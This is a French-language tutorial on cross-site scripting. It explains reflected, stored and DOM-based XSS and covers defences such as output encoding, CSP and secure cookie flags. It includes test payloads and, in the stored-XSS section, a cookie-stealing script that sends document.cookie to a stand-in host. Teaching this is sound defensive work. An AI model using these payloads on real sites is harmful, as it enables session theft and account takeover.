# Cours : Comprendre le XSS (Cross-Site Scripting)

Le **XSS (Cross-Site Scripting)** est une vulnérabilité web qui permet à un attaquant d’injecter du code JavaScript malveillant dans une page consultée par d'autres utilisateurs.

---

# 1. Le concept clé : "L'exécution côté client"

Contrairement à une Injection SQL (qui cible le serveur), le XSS cible les utilisateurs.

L’attaquant utilise le site comme un vecteur pour envoyer un script au navigateur de la victime.  
Le navigateur croit que le script vient du site légitime → il l’exécute automatiquement.

---

# 2. Les 3 types de XSS

## A. XSS Réfléchi (Reflected XSS)

Le script est renvoyé immédiatement dans la réponse HTTP.

### Exemple

URL normale :  
`site.com/search?name=Jean`

URL malveillante :  
`site.com/search?name=<script>alert('Hacked')</script>`

Si la victime clique sur le lien → le script s’exécute.

---

## B. XSS Stocké (Stored XSS)

Le script est enregistré dans la base de données.

### Exemple

Un commentaire contient :

`<script>fetch('http://hacker.com/steal?cookie=' + document.cookie)</script>`

Chaque utilisateur qui consulte le commentaire exécute le script → vol de session.

---

## C. XSS basé sur le DOM (DOM-Based XSS)

La vulnérabilité est dans le JavaScript côté client.

### Exemple

`site.com/page#<script>alert(1)</script>`

Si le code JavaScript affiche le contenu du `#` sans validation → exécution.

---

# 3. Impact

Un attaquant peut :

- Voler des cookies de session  
- Capturer les frappes clavier  
- Rediriger vers un site de phishing  
- Modifier la page  
- Effectuer des actions au nom de l’utilisateur  

Cela peut mener à la prise de contrôle d’un compte.

---

# 4. Test (Proof of Concept)

Payload simple :  
`<script>alert(1)</script>`

Alternative si bloqué :  
`<img src=x onerror=alert(1)>`

Si une alerte apparaît → vulnérable.

---

# 5. Protection

## Règle d’or
Ne jamais faire confiance aux entrées utilisateur.

## Filtrer les entrées
Contrôler les caractères :  
`< > " ' &`

## Encoder les sorties (le plus important)

Au lieu de :  
`<b>Jean</b>`

Utiliser :  
`&lt;b&gt;Jean&lt;/b&gt;`

## Utiliser CSP
`Content-Security-Policy: script-src 'self';`

## Sécuriser les cookies
`HttpOnly`  
`Secure`  
`SameSite`

---

# Résumé

Le XSS consiste à injecter du code là où le site attend du texte.  
Si l’application ne distingue pas données et code, l’attaquant peut prendre le contrôle des sessions utilisateurs.
